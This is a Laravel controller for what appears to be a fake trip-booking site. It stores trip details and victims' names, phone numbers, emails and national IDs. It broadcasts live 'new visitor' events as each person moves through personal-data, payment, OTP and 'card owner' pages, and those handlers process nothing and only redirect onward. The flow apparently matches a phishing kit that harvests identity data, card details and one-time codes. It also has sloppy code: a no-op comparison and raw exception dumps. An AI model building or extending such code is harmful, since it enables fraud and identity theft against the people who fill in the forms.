<?php

namespace App\Http\Controllers;

use App\Models\Trip;
use App\Events\NewVisitor;
use App\Events\SendPeople;
use App\Events\SendVisit;
use Illuminate\Http\Request;
use App\Models\VisitorNotifications;

class TripController extends Controller
{
    public function saveTrip($trip_type, Request $request)
    {
        // dd($trip_type);
        try {
            $request['direction_type'] == $request->type;
            $this->validate($request, [
                'from' => 'required|string',
                'to' => 'required|string',
                'direction_type' => 'required|string|in:one_direction,go_and_back',
                'departure_date' => 'required|date',
                'departure_time' => 'required',
                'return_date' => 'sometimes|nullable|date',
                'adults_count' => 'required|integer|min:1',
                'child_count' => 'required|integer|min:0',
                'infant_count' => 'required|integer|min:0',
                'special_needs_count' => 'required|integer|min:0',
                'ticket_type' => 'required|string|in:economic,premium',
            ]);
            unset($request['direction_type']);
            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
            $trip = Trip::create($request->all());

            return redirect()->route('summary', $trip->id);
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function summary($id)
    {
        $summary = Trip::select('from', 'to', 'departure_time', 'type', 'departure_date', 'return_date', 'price')->find($id);
        return view('summary', compact('summary'));
    }
    public function peopleDataPage()
    {
        // dd($trip_type);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'صفحة البيانات الشخصية','step_number'=>2]);
            session()->put('visitor', json_encode($not));
            event(new NewVisitor($not));
            event(new SendVisit($not));
            return view('people_data');
        }
        return redirect('/');
    }
    public function peopleDataStore(Request $request)
    {

        try {
            $validated = $this->validate($request, [
                'people_name' => 'required|string',
                'phone' => 'required|string',
                'identityType' => 'required|string',
                'email' => 'required|string',
                'natID' => 'required|string',
                'gender' => 'required|string',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $validated['step_number'] = 3;
                $validated['page']  = 'قام بإرسال بياناته';

                $not  = VisitorNotifications::find($visitor->id);
                $not->update($validated);
                session()->put('visitor', json_encode($not));
                event(new NewVisitor($not));
                event(new SendPeople($not));
                return redirect()->route('trip_payment');
            }
            return redirect('/');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function paymentPage()
    {
        // dd($trip_type);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'قام بإرسال بياناته','step_number'=>4]);
            session()->put('visitor', json_encode($not));
            event(new NewVisitor($not));
            event(new SendVisit($not));
            return view('trip_payment');
        }
        return redirect('/');
    }
    public function paymentStore(Request $request)
    {
        // dd($trip_type);
        return redirect()->route('verify_otp');
    }
    public function verifyOtp()
    {
        // dd($trip_type);
        return view('verify_otp');
    }
    public function verifyOtpStore(Request $request)
    {
        // dd($trip_type);
        return redirect()->route('confirm_card_owner');
    }
    ////////////
    public function partAuth()
    {
        // dd($trip_type);
        return view('card_auth');
    }
    public function partAuthStore(Request $request)
    {
        // dd($trip_type);
        return redirect('/');
    }
}
